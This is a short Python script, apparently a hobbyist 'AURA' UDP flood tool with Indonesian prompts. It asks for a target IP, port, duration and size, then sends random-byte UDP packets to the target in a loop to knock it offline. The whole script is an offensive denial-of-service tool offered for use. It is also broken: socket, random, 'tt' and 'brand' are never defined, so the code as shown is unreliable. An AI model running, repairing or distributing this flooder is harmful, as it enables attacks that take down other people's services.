import os
import codecs
import sys

os.system("clear")

print("""\033[94m
     _   _   _ ____      _    
    / \ | | | |  _ \    / \   
   / _ \| | | | |_) |  / _ \  
  / ___ \ |_| |  _ <  / ___ \ 
 /_/   \_\___/|_| \_\/_/   \_\
                              
          MADE WITH CODE
          BY AXEL X AURA
         CODE BY ITZSEVEN
""")
ip = str(input("\033[91m IP \033[91m  ====> : "))
port = int(input(" \033[91m Port \033[91m====> : "))
time = int(input(" \033[91m Packet \033[91m      ====> : "))
size = int(input("\033[91m Thread \033[91m    ====> : "))
choice = str(input("\033[91m Yakin? y/n \033[91m ===> : "))

print("""\033[96m MENGIRIM PAKET...""")

os.system("clear")

def attack(ip, port, time, size):



    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m=+=+=+=+ PAKET TERKIRIM! +=+=+=+=")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('\033[91mAttack Finished')
    os.system("clear")

if choice == 'y':
    try:
        attack(ip, port, time, size)
    except KeyboardInterrupt:
        print('Attack stopped.')

